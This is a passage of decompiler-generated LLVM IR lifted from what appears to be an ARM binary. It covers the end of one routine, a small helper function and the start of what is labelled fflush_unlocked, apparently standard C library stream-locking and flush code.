  %v2_1cb18 = load i32, i32* %r7.global-to-local, align 4
  %v3_1cb18 = add i32 %v2_1cb18, %v1_1cb18
  %v4_1cb18 = inttoptr i32 %v3_1cb18 to i32*
  %v5_1cb18 = load i32, i32* %v4_1cb18, align 4
  store i32 %v5_1cb18, i32* %r3.global-to-local, align 4
  %v3_1cb1c = inttoptr i32 %v5_1cb18 to i32*
  store i32 %v3_1cb08, i32* %v3_1cb1c, align 4
  %v0_1cb20 = load i32, i32* %r2.global-to-local, align 4
  %v1_1cb20 = inttoptr i32 %v0_1cb20 to i16*
  %v2_1cb20 = load i16, i16* %v1_1cb20, align 2
  %v3_1cb20 = zext i16 %v2_1cb20 to i32
  store i32 %v3_1cb20, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_1cb14
  %v2_1cb208 = load i16, i16* %v1_1cafc, align 2
  %v3_1cb209 = zext i16 %v2_1cb208 to i32
  store i32 %v3_1cb209, i32* %r3.global-to-local, align 4
  %v3_1cb24 = add i32 %v0_1cb14, 32
  %v4_1cb24 = inttoptr i32 %v3_1cb24 to i32*
  store i32 %v3_1cb08, i32* %v4_1cb24, align 4
  %v0_1cb28.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_1cb28 = phi i32 [ %v3_1cb20, %.thread ], [ %v0_1cb28.pre, %bb49 ]
  %v1_1cb28 = and i32 %v0_1cb28, 8192
  %v2_1cb28 = icmp eq i32 %v1_1cb28, 0
  br i1 %v2_1cb28, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1cb2c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1cb2c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_1cb30 = xor i1 %v2_1cb28, true
  call void @__pseudo_cond_branch(i1 %v1_1cb30, i32 ptrtoint (i32* @global_var_17778.1695 to i32))
  %v0_1cb34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cb34

dec_label_pc_1cb34:                               ; preds = %.thread38, %bb52
  %v0_1cb34 = phi i32 [ %v0_1cb34.pre, %bb52 ], [ %v3_1cb08, %.thread38 ]
  store i32 %v0_1cb34, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cb38 = icmp eq i32 %v0_1cb34, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1cb38, label %dec_label_pc_1cb44, label %dec_label_pc_1cafc

dec_label_pc_1cb44:                               ; preds = %dec_label_pc_1cb34, %dec_label_pc_1cad0
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_1cb48 = load i32, i32* %r5.global-to-local, align 4
  %v2_1cb48 = add i32 %v0_1cb48, 168
  %v3_1cb48 = inttoptr i32 %v2_1cb48 to i32*
  %v4_1cb48 = load i32, i32* %v3_1cb48, align 4
  store i32 %v4_1cb48, i32* %r0.global-to-local, align 4
  %v1_1cb4c = add i32 %v4_1cb48, 4
  %v2_1cb4c = inttoptr i32 %v1_1cb4c to i32*
  %v3_1cb4c = load i32, i32* %v2_1cb4c, align 4
  %v1_1cb50 = add i32 %v3_1cb4c, -1
  store i32 %v1_1cb50, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cb54 = icmp eq i32 %v1_1cb50, 0
  store i32 %v1_1cb50, i32* %v2_1cb4c, align 4
  br i1 %v2_1cb54, label %dec_label_pc_1cb60, label %dec_label_pc_1cbc0

dec_label_pc_1cb60:                               ; preds = %dec_label_pc_1cb44
  %v0_1cb60 = load i32, i32* %r3.global-to-local, align 4
  %v1_1cb60 = load i32, i32* %r0.global-to-local, align 4
  %v2_1cb60 = add i32 %v1_1cb60, 8
  %v3_1cb60 = inttoptr i32 %v2_1cb60 to i32*
  store i32 %v0_1cb60, i32* %v3_1cb60, align 4
  %v0_1cb64 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1cb64, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cb68

dec_label_pc_1cb68:                               ; preds = %dec_label_pc_1cb98.dec_label_pc_1cb68_crit_edge, %dec_label_pc_1cb60
  %v0_1cb68 = phi i32 [ %v0_1cb68.pre, %dec_label_pc_1cb98.dec_label_pc_1cb68_crit_edge ], [ %v0_1cb64, %dec_label_pc_1cb60 ]
  %v1_1cb68 = inttoptr i32 %v0_1cb68 to i32*
  %v2_1cb68 = load i32, i32* %v1_1cb68, align 4
  store i32 %v2_1cb68, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1cb68, i32* %r2.global-to-local, align 4
  %v2_1cb7474 = load i32, i32* %v1_1cb68, align 4
  store i32 %v2_1cb7474, i32* %r3.global-to-local, align 4
  %v3_1cb7876 = icmp uge i32 %v2_1cb7474, %v2_1cb68
  store i1 %v3_1cb7876, i1* %cpsr_c.global-to-local, align 1
  %v9_1cb7882 = icmp eq i32 %v2_1cb7474, %v2_1cb68
  br i1 %v9_1cb7882, label %dec_label_pc_1cb80, label %dec_label_pc_1cb98

dec_label_pc_1cb80:                               ; preds = %dec_label_pc_1cb68, %dec_label_pc_1cb80.dec_label_pc_1cb74_crit_edge
  %v0_1cb8083 = phi i32 [ %v1_1cb78.pre, %dec_label_pc_1cb80.dec_label_pc_1cb74_crit_edge ], [ %v2_1cb68, %dec_label_pc_1cb68 ]
  store i32 %v0_1cb8083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1cb90 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1cb90, label %dec_label_pc_1cb94, label %dec_label_pc_1cb80.dec_label_pc_1cb74_crit_edge

dec_label_pc_1cb80.dec_label_pc_1cb74_crit_edge:  ; preds = %dec_label_pc_1cb80
  %v0_1cb74.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1cb78.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1cb74 = inttoptr i32 %v0_1cb74.pre to i32*
  %v2_1cb74 = load i32, i32* %v1_1cb74, align 4
  store i32 %v2_1cb74, i32* %r3.global-to-local, align 4
  %v3_1cb78 = icmp uge i32 %v2_1cb74, %v1_1cb78.pre
  store i1 %v3_1cb78, i1* %cpsr_c.global-to-local, align 1
  %v9_1cb78 = icmp eq i32 %v2_1cb74, %v1_1cb78.pre
  br i1 %v9_1cb78, label %dec_label_pc_1cb80, label %dec_label_pc_1cb98

dec_label_pc_1cb94:                               ; preds = %dec_label_pc_1cb80
  %v0_1cb94 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1cb94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cb98

dec_label_pc_1cb98:                               ; preds = %dec_label_pc_1cb68, %dec_label_pc_1cb80.dec_label_pc_1cb74_crit_edge, %dec_label_pc_1cb94
  %v0_1cba0 = phi i32 [ %v0_1cb94, %dec_label_pc_1cb94 ], [ %v2_1cb7474, %dec_label_pc_1cb68 ], [ %v2_1cb74, %dec_label_pc_1cb80.dec_label_pc_1cb74_crit_edge ]
  %v1_1cb98 = phi i32 [ %v0_1cb94, %dec_label_pc_1cb94 ], [ %v2_1cb68, %dec_label_pc_1cb68 ], [ %v1_1cb78.pre, %dec_label_pc_1cb80.dec_label_pc_1cb74_crit_edge ]
  %v3_1cb98 = icmp uge i32 %v0_1cba0, %v1_1cb98
  store i1 %v3_1cb98, i1* %cpsr_c.global-to-local, align 1
  %v9_1cb98 = icmp eq i32 %v0_1cba0, %v1_1cb98
  br i1 %v9_1cb98, label %dec_label_pc_1cba0, label %dec_label_pc_1cb98.dec_label_pc_1cb68_crit_edge

dec_label_pc_1cb98.dec_label_pc_1cb68_crit_edge:  ; preds = %dec_label_pc_1cb98
  %v0_1cb68.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cb68

dec_label_pc_1cba0:                               ; preds = %dec_label_pc_1cb98
  %v2_1cba0 = icmp ne i32 %v1_1cb98, 0
  store i1 %v2_1cba0, i1* %cpsr_c.global-to-local, align 1
  %v7_1cba4 = icmp slt i32 %v1_1cb98, 2
  br i1 %v7_1cba4, label %dec_label_pc_1cbc0, label %dec_label_pc_1cba8

dec_label_pc_1cba8:                               ; preds = %dec_label_pc_1cba0
  %v0_1cba8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1cba8, i32* %r0.global-to-local, align 4
  %v0_1cbac = load i32, i32* %r1.global-to-local, align 4
  %v1_1cbac = add i32 %v0_1cbac, 129
  store i32 %v1_1cbac, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cbc0

dec_label_pc_1cbc0:                               ; preds = %dec_label_pc_1cb44, %dec_label_pc_1cba8, %dec_label_pc_1cba0
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_1cbc4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1cbc4 = add i32 %v0_1cbc4, 92
  %v3_1cbc4 = inttoptr i32 %v2_1cbc4 to i32*
  %v4_1cbc4 = load i32, i32* %v3_1cbc4, align 4
  store i32 %v4_1cbc4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1cbcc = inttoptr i32 %v4_1cbc4 to i32*
  store i32 0, i32* %v2_1cbcc, align 4
  br label %dec_label_pc_1cbd0

dec_label_pc_1cbd0:                               ; preds = %dec_label_pc_1ca44, %dec_label_pc_1ca6c, %dec_label_pc_1cbc0
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_1cbd4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1cbd4 = add i32 %v0_1cbd4, 176
  %v3_1cbd4 = inttoptr i32 %v2_1cbd4 to i32*
  %v4_1cbd4 = load i32, i32* %v3_1cbd4, align 4
  store i32 %v4_1cbd4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1cbdc = add i32 %v0_1cbd4, 12
  %v3_1cbdc = inttoptr i32 %v2_1cbdc to i32*
  %v4_1cbdc = load i32, i32* %v3_1cbdc, align 4
  store i32 %v4_1cbdc, i32* %r1.global-to-local, align 4
  %v1_1cbe0 = add i32 %v4_1cbd4, 4
  %v2_1cbe0 = inttoptr i32 %v1_1cbe0 to i32*
  %v3_1cbe0 = load i32, i32* %v2_1cbe0, align 4
  store i32 %v3_1cbe0, i32* %r2.global-to-local, align 4
  %v1_1cbe4 = inttoptr i32 %v4_1cbdc to i32*
  %v2_1cbe4 = load i32, i32* %v1_1cbe4, align 4
  %v1_1cbe8 = add i32 %v3_1cbe0, -1
  store i32 %v1_1cbe8, i32* %r2.global-to-local, align 4
  %v1_1cbec = add i32 %v2_1cbe4, -1
  store i32 %v1_1cbec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cbf0 = icmp eq i32 %v1_1cbe8, 0
  store i32 %v1_1cbec, i32* %v1_1cbe4, align 4
  %v0_1cbf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1cbf8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1cbf8 = add i32 %v1_1cbf8, 4
  %v3_1cbf8 = inttoptr i32 %v2_1cbf8 to i32*
  store i32 %v0_1cbf8, i32* %v3_1cbf8, align 4
  br i1 %v2_1cbf0, label %dec_label_pc_1cc00, label %dec_label_pc_1cc60

dec_label_pc_1cc00:                               ; preds = %dec_label_pc_1cbd0
  %v0_1cc00 = load i32, i32* %r2.global-to-local, align 4
  %v1_1cc00 = load i32, i32* %r0.global-to-local, align 4
  %v2_1cc00 = add i32 %v1_1cc00, 8
  %v3_1cc00 = inttoptr i32 %v2_1cc00 to i32*
  store i32 %v0_1cc00, i32* %v3_1cc00, align 4
  %v0_1cc04 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1cc04, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cc08

dec_label_pc_1cc08:                               ; preds = %dec_label_pc_1cc38.dec_label_pc_1cc08_crit_edge, %dec_label_pc_1cc00
  %v0_1cc08 = phi i32 [ %v0_1cc08.pre, %dec_label_pc_1cc38.dec_label_pc_1cc08_crit_edge ], [ %v0_1cc04, %dec_label_pc_1cc00 ]
  %v1_1cc08 = inttoptr i32 %v0_1cc08 to i32*
  %v2_1cc08 = load i32, i32* %v1_1cc08, align 4
  store i32 %v2_1cc08, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1cc08, i32* %r2.global-to-local, align 4
  %v2_1cc1462 = load i32, i32* %v1_1cc08, align 4
  store i32 %v2_1cc1462, i32* %r3.global-to-local, align 4
  %v3_1cc1864 = icmp uge i32 %v2_1cc1462, %v2_1cc08
  store i1 %v3_1cc1864, i1* %cpsr_c.global-to-local, align 1
  %v9_1cc1870 = icmp eq i32 %v2_1cc1462, %v2_1cc08
  br i1 %v9_1cc1870, label %dec_label_pc_1cc20, label %dec_label_pc_1cc38

dec_label_pc_1cc20:                               ; preds = %dec_label_pc_1cc08, %dec_label_pc_1cc20.dec_label_pc_1cc14_crit_edge
  %v0_1cc2071 = phi i32 [ %v1_1cc18.pre, %dec_label_pc_1cc20.dec_label_pc_1cc14_crit_edge ], [ %v2_1cc08, %dec_label_pc_1cc08 ]
  store i32 %v0_1cc2071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1cc30 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1cc30, label %dec_label_pc_1cc34, label %dec_label_pc_1cc20.dec_label_pc_1cc14_crit_edge

dec_label_pc_1cc20.dec_label_pc_1cc14_crit_edge:  ; preds = %dec_label_pc_1cc20
  %v0_1cc14.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1cc18.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1cc14 = inttoptr i32 %v0_1cc14.pre to i32*
  %v2_1cc14 = load i32, i32* %v1_1cc14, align 4
  store i32 %v2_1cc14, i32* %r3.global-to-local, align 4
  %v3_1cc18 = icmp uge i32 %v2_1cc14, %v1_1cc18.pre
  store i1 %v3_1cc18, i1* %cpsr_c.global-to-local, align 1
  %v9_1cc18 = icmp eq i32 %v2_1cc14, %v1_1cc18.pre
  br i1 %v9_1cc18, label %dec_label_pc_1cc20, label %dec_label_pc_1cc38

dec_label_pc_1cc34:                               ; preds = %dec_label_pc_1cc20
  %v0_1cc34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1cc34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cc38

dec_label_pc_1cc38:                               ; preds = %dec_label_pc_1cc08, %dec_label_pc_1cc20.dec_label_pc_1cc14_crit_edge, %dec_label_pc_1cc34
  %v0_1cc40 = phi i32 [ %v0_1cc34, %dec_label_pc_1cc34 ], [ %v2_1cc1462, %dec_label_pc_1cc08 ], [ %v2_1cc14, %dec_label_pc_1cc20.dec_label_pc_1cc14_crit_edge ]
  %v1_1cc38 = phi i32 [ %v0_1cc34, %dec_label_pc_1cc34 ], [ %v2_1cc08, %dec_label_pc_1cc08 ], [ %v1_1cc18.pre, %dec_label_pc_1cc20.dec_label_pc_1cc14_crit_edge ]
  %v3_1cc38 = icmp uge i32 %v0_1cc40, %v1_1cc38
  store i1 %v3_1cc38, i1* %cpsr_c.global-to-local, align 1
  %v9_1cc38 = icmp eq i32 %v0_1cc40, %v1_1cc38
  br i1 %v9_1cc38, label %dec_label_pc_1cc40, label %dec_label_pc_1cc38.dec_label_pc_1cc08_crit_edge

dec_label_pc_1cc38.dec_label_pc_1cc08_crit_edge:  ; preds = %dec_label_pc_1cc38
  %v0_1cc08.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cc08

dec_label_pc_1cc40:                               ; preds = %dec_label_pc_1cc38
  %v2_1cc40 = icmp ne i32 %v1_1cc38, 0
  store i1 %v2_1cc40, i1* %cpsr_c.global-to-local, align 1
  %v7_1cc44 = icmp slt i32 %v1_1cc38, 2
  br i1 %v7_1cc44, label %dec_label_pc_1cc60, label %dec_label_pc_1cc48

dec_label_pc_1cc48:                               ; preds = %dec_label_pc_1cc40
  %v0_1cc48 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1cc48, i32* %r0.global-to-local, align 4
  %v0_1cc4c = load i32, i32* %r1.global-to-local, align 4
  %v1_1cc4c = add i32 %v0_1cc4c, 129
  store i32 %v1_1cc4c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cc60

dec_label_pc_1cc60:                               ; preds = %dec_label_pc_1cbd0, %dec_label_pc_1cc48, %dec_label_pc_1cc40
  %v2_1cc64 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1cc64, i32* %r4.global-to-local, align 4
  %v1_1cc68 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1cc68

; uselistorder directives
  uselistorder i32 %v0_1cc34, { 1, 0, 2 }
  uselistorder i32 %v1_1cc18.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1cc08, { 1, 0 }
  uselistorder i32 %v0_1cb94, { 1, 0, 2 }
  uselistorder i32 %v1_1cb78.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1cb68, { 1, 0 }
  uselistorder i32 %v0_1cb34, { 2, 1, 0 }
  uselistorder i32 %v0_1cad8, { 1, 0 }
  uselistorder i32 %v0_1cabc, { 1, 0, 2 }
  uselistorder i32 %v1_1caa0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1ca8c, { 1, 0 }
  uselistorder i32 %v0_1ca30, { 1, 0, 2 }
  uselistorder i32 %v1_1ca14.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_1c9e8, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 41, 6, 7, 8, 9, 10, 11, 12, 14, 13, 42, 15, 16, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 26, 25, 43, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 44, 39, 40 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 20, 21, 4, 5, 6, 7, 22, 23, 8, 11, 9, 10, 0, 12, 13, 24, 25, 14, 15, 16, 17, 18, 26, 27, 19 }
  uselistorder i32 47, { 3, 1, 6, 0, 4, 5, 2 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1cc60, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1cc38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cc20, { 1, 0 }
  uselistorder label %dec_label_pc_1cbd0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cbc0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1cb98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cb80, { 1, 0 }
  uselistorder label %dec_label_pc_1cb34, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1cafc, { 1, 0 }
  uselistorder label %dec_label_pc_1cad0, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1cac0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1caa8, { 1, 0 }
  uselistorder label %dec_label_pc_1ca44, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_1ca34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ca1c, { 1, 0 }
}

define i32 @function_1cc70(i16* %arg1) local_unnamed_addr {
dec_label_pc_1cc70:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1cc70 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1cc70, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1cc70
  %v2_1cc70 = trunc i32 %tmp to i16
  store i16 %v2_1cc70, i16* %arg1, align 2
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1cc70, %bb
  %v10_1cc84 = phi i32 [ %tmp, %dec_label_pc_1cc70 ], [ 0, %bb ]
  ret i32 %v10_1cc84

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v6_1cc88 = load i32, i32* @r5, align 4
  store i32 88, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r6, align 4
  %v4_1cc98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 88) to i32*), align 4
  store i32 %v4_1cc98, i32* %r3.global-to-local, align 4
  %v4_1cc9c = icmp uge i32 %tmp, %v4_1cc98
  store i1 %v4_1cc9c, i1* %cpsr_c.global-to-local, align 1
  %v10_1cc9c = icmp eq i32 %tmp, %v4_1cc98
  br i1 %v10_1cc9c, label %bb, label %dec_label_pc_1ccb4

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_1ccc4

dec_label_pc_1ccb4:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1ccb8 = icmp eq i16* %arg1, null
  br i1 %v3_1ccb8, label %dec_label_pc_1ccc4, label %dec_label_pc_1cfd8

dec_label_pc_1ccc4:                               ; preds = %bb, %dec_label_pc_1ccb4
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_1ccb4 ]
  store i32 176, i32* %r3.global-to-local, align 4
  %v4_1ccc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 176) to i32*), align 4
  store i32 %v4_1ccc8, i32* %r5.global-to-local, align 4
  %v0_1cccc = call i32 @__aeabi_read_tp()
  store i32 %v0_1cccc, i32* %r0.global-to-local, align 4
  %v1_1ccd0 = add i32 %v4_1ccc8, 8
  %v2_1ccd0 = inttoptr i32 %v1_1ccd0 to i32*
  %v3_1ccd0 = load i32, i32* %v2_1ccd0, align 4
  store i32 %v3_1ccd0, i32* %r3.global-to-local, align 4
  %v1_1ccd4 = add i32 %v0_1cccc, -1168
  store i32 %v1_1ccd4, i32* %r8.global-to-local, align 4
  %v3_1ccd8 = icmp uge i32 %v3_1ccd0, %v1_1ccd4
  store i1 %v3_1ccd8, i1* %cpsr_c.global-to-local, align 1
  %v9_1ccd8 = icmp eq i32 %v3_1ccd0, %v1_1ccd4
  br i1 %v9_1ccd8, label %dec_label_pc_1cd20, label %dec_label_pc_1cce0

dec_label_pc_1cce0:                               ; preds = %dec_label_pc_1ccc4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_1ccc8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1ccec143 = inttoptr i32 %v4_1ccc8 to i32*
  %v2_1ccec144 = load i32, i32* %v1_1ccec143, align 4
  store i32 %v2_1ccec144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1ccf0146 = icmp eq i32 %v2_1ccec144, 0
  br i1 %v9_1ccf0146, label %dec_label_pc_1ccf8, label %dec_label_pc_1cd10

dec_label_pc_1ccf8:                               ; preds = %dec_label_pc_1cce0, %dec_label_pc_1ccf8.dec_label_pc_1ccec_crit_edge
  %v0_1ccf8147 = phi i32 [ %v1_1ccf0.pre, %dec_label_pc_1ccf8.dec_label_pc_1ccec_crit_edge ], [ 0, %dec_label_pc_1cce0 ]
  store i32 %v0_1ccf8147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1cd08 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1cd08, label %dec_label_pc_1cd0c, label %dec_label_pc_1ccf8.dec_label_pc_1ccec_crit_edge

dec_label_pc_1ccf8.dec_label_pc_1ccec_crit_edge:  ; preds = %dec_label_pc_1ccf8
  %v0_1ccec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1ccf0.pre = load i32, i32* @r4, align 4
  %v1_1ccec = inttoptr i32 %v0_1ccec.pre to i32*
  %v2_1ccec = load i32, i32* %v1_1ccec, align 4
  store i32 %v2_1ccec, i32* %r3.global-to-local, align 4
  %v3_1ccf0 = icmp uge i32 %v2_1ccec, %v1_1ccf0.pre
  store i1 %v3_1ccf0, i1* %cpsr_c.global-to-local, align 1
  %v9_1ccf0 = icmp eq i32 %v2_1ccec, %v1_1ccf0.pre
  br i1 %v9_1ccf0, label %dec_label_pc_1ccf8, label %dec_label_pc_1cd10

dec_label_pc_1cd0c:                               ; preds = %dec_label_pc_1ccf8
  %v0_1cd0c = load i32, i32* @r4, align 4
  store i32 %v0_1cd0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cd10

dec_label_pc_1cd10:                               ; preds = %dec_label_pc_1cce0, %dec_label_pc_1ccf8.dec_label_pc_1ccec_crit_edge, %dec_label_pc_1cd0c
  %v0_1cd10 = phi i32 [ %v0_1cd0c, %dec_label_pc_1cd0c ], [ %v2_1ccec144, %dec_label_pc_1cce0 ], [ %v2_1ccec, %dec_label_pc_1ccf8.dec_label_pc_1ccec_crit_edge ]
  %v1_1cd10 = phi i32 [ %v0_1cd0c, %dec_label_pc_1cd0c ], [ 0, %dec_label_pc_1cce0 ], [ %v1_1ccf0.pre, %dec_label_pc_1ccf8.dec_label_pc_1ccec_crit_edge ]
  %v3_1cd10 = icmp uge i32 %v0_1cd10, %v1_1cd10
  store i1 %v3_1cd10, i1* %cpsr_c.global-to-local, align 1
  %v9_1cd10 = icmp eq i32 %v0_1cd10, %v1_1cd10
  br i1 %v9_1cd10, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_1cd10
  %v1_1cd14 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1cd14, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_1cd10, %bb65
  %v1_1cd18 = xor i1 %v9_1cd10, true
  call void @__pseudo_cond_branch(i1 %v1_1cd18, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1cd1c = load i32, i32* %r8.global-to-local, align 4
  %v1_1cd1c = load i32, i32* %r5.global-to-local, align 4
  %v2_1cd1c = add i32 %v1_1cd1c, 8
  %v3_1cd1c = inttoptr i32 %v2_1cd1c to i32*
  store i32 %v0_1cd1c, i32* %v3_1cd1c, align 4
  br label %dec_label_pc_1cd20

dec_label_pc_1cd20:                               ; preds = %dec_label_pc_1ccc4, %bb66
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_1cd24 = load i32, i32* @r6, align 4
  %v2_1cd24 = add i32 %v0_1cd24, 176
  %v3_1cd24 = inttoptr i32 %v2_1cd24 to i32*
  %v4_1cd24 = load i32, i32* %v3_1cd24, align 4
  store i32 %v4_1cd24, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1cd2c = add i32 %v0_1cd24, 12
  %v3_1cd2c = inttoptr i32 %v2_1cd2c to i32*
  %v4_1cd2c = load i32, i32* %v3_1cd2c, align 4
  store i32 %v4_1cd2c, i32* %r2.global-to-local, align 4
  %v1_1cd30 = add i32 %v4_1cd24, 4
  %v2_1cd30 = inttoptr i32 %v1_1cd30 to i32*
  %v3_1cd30 = load i32, i32* %v2_1cd30, align 4
  store i32 %v3_1cd30, i32* %r1.global-to-local, align 4
  %v1_1cd34 = inttoptr i32 %v4_1cd2c to i32*
  %v2_1cd34 = load i32, i32* %v1_1cd34, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cd38 = icmp eq i32 %v3_1cd30, 0
  %v1_1cd3c = add i32 %v2_1cd34, 1
  store i32 %v1_1cd3c, i32* %r3.global-to-local, align 4
